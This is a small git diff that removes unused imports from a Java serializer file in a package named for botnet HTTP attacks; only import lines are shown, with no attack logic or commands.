@@ -26,21 +26,16 @@
 
 package com.acmutv.botnet.core.attack.serial;
 
-import com.acmutv.botnet.config.AppConfiguration;
-import com.acmutv.botnet.config.serial.AppConfigurationDeserializer;
 import com.acmutv.botnet.core.attack.HttpAttack;
-import com.acmutv.botnet.core.control.Controller;
 import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonGenerator;
 import com.fasterxml.jackson.databind.SerializerProvider;
 import com.fasterxml.jackson.databind.ser.std.StdSerializer;
-import org.quartz.CronExpression;
 
 import java.io.IOException;
 import java.net.URL;
-import java.util.List;
 import java.util.Map;
 
 /**
